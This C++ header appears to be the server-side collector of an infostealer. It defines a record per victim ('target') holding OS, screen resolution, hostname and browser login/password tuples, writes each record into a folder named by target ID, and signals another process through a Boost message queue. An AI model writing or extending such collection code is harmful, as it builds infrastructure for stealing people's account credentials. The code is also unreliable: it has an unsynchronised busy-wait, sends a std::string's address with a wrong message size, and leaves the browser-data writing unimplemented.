#pragma once
#include <boost/interprocess/ipc/message_queue.hpp>
#include <queue>
#include "fileManager.hpp"

namespace InterProcess {
	namespace bipc = boost::interprocess;

	struct Data {             //Data storage for sending to another proccess
		Data() = default;
		Data(const Data& other) = delete;              //move only object
		Data& operator=(const Data& other) = delete;   //move only object		

		struct targetInfo { //all fields are required
			std::string os;
			std::string resolution;
			std::string hostName;
		}_targetInfo;

		struct BrowserData { //all fields are required
			std::string browserName;
			std::vector<std::tuple<std::string, std::string, std::string>>resources; //res.name - login - pass
		};

		std::vector<std::unique_ptr<BrowserData>>browsersData;

		std::string _targetId; //required field
	};

	class IPCworkDispatcher:private FileManager { //class that encapsulates and implements parallel message queue processing
	protected:                                    //private inheritance of fileManager to hide methods 
		IPCworkDispatcher() {
			p_worker = std::make_unique<std::thread>(std::bind(&IPCworkDispatcher::dataWaiter, this));
		}
		virtual ~IPCworkDispatcher() {
			this->stop(); //if not called, p_worker will be destroyed with the active thread;
			if (p_worker.get()->joinable()) {
				p_worker.get()->join();
			}
		} 
	public:
		static std::shared_ptr<IPCworkDispatcher> getInstance() {
			struct make_shared_enabler : public IPCworkDispatcher {};
			static std::shared_ptr<IPCworkDispatcher>_disp = std::make_shared<make_shared_enabler>();
			return _disp;
		}
		template<typename T>
		void setCallback(T fun) { //setter for IPC callback which will be executed on new message
			callback = fun;
		}

		void start() {
			if (p_worker.get()->joinable()) {
				p_worker.get()->detach();
			}
		}
		void enqueue(std::unique_ptr<Data>&&data) {       //this func will be called from multiple parser threads through the IPC.newData()
			std::lock_guard<std::mutex>dataLock(dataMt);  //2 PARSER THREADS PUTTS DATA IN QUEUE AND THEN 1 CURRENT WORKER GETTS IT
			dataQueue.push(std::move(data));
		}
	private:
		bool write() override {
			try {
				std::filesystem::path path(root); //user folder path
				path.concat(currentData->_targetId); 

				createDir(path); //creating user folder with targetId as name
				
				openTo(std::filesystem::path(path).concat("/info.txt")); //creating file with os info
				
				dataFile << "os:" << currentData->_targetInfo.os << "\n"
					<< "screen:" << currentData->_targetInfo.resolution << "\n"
					<< "host:" << currentData->_targetInfo.hostName << "\n";
				close();
			}
			catch (std::exception& e) {
				std::cout << e.what();
			}
			//iter throught the all browsers data //create their folders and write all info into it
			return true;
		}
		void dataWaiter() {     //{spinlocked} waiting for new data and then then calls the specific callback
			while (!stop_flag) {                
				if (!dataQueue.empty()) {
					std::unique_lock<std::mutex>ulk(dataMt);

					currentData.reset(dataQueue.front().release()); //free memory of processed data and own's current data ptr
					dataQueue.pop(); //drop data ptr after release

					ulk.unlock();

					this->write(); //write data to file

					callback(currentData->_targetId); //send data's id to other process
				}
			}
		}
		void stop() {
			stop_flag = true;
		}

	private:
		std::atomic_bool stop_flag = ATOMIC_VAR_INIT(false);
		std::unique_ptr<std::thread>p_worker; 

		std::mutex dataMt;
		std::queue<std::unique_ptr<Data>>dataQueue; //onws all data ptrs wich are created in server parser func

		std::unique_ptr<Data>currentData; //current processing data from dataWaiter

		std::function<void(const std::string)>callback;
	};

	class IPC {

	public:
		IPC() {
			wd = IPCworkDispatcher::getInstance();

			bipc::message_queue::remove("dataReady_q");
			msg_queue = std::make_unique<bipc::message_queue>(bipc::create_only, "dataReady_q", 100, sizeof(std::string));
		}
		~IPC() = default;

		void _init() { //make able to perform ipc operations;
			wd->setCallback(std::bind(&IPC::notify, this, std::placeholders::_1));
			wd->start(); //execute worker thread
		}
		void newData(std::unique_ptr<Data>&&data) const { //no effect before _init() call
			wd->enqueue(std::move(data));
		}
	private:
		std::unique_ptr<bipc::message_queue>msg_queue;
		std::shared_ptr<IPCworkDispatcher>wd;
	private:
		void notify(const std::string& id) { //Executs from IPCworkDispatcher thread and sends target id to another process
			msg_queue->send(&id, id.size(),1);
		}
	};
};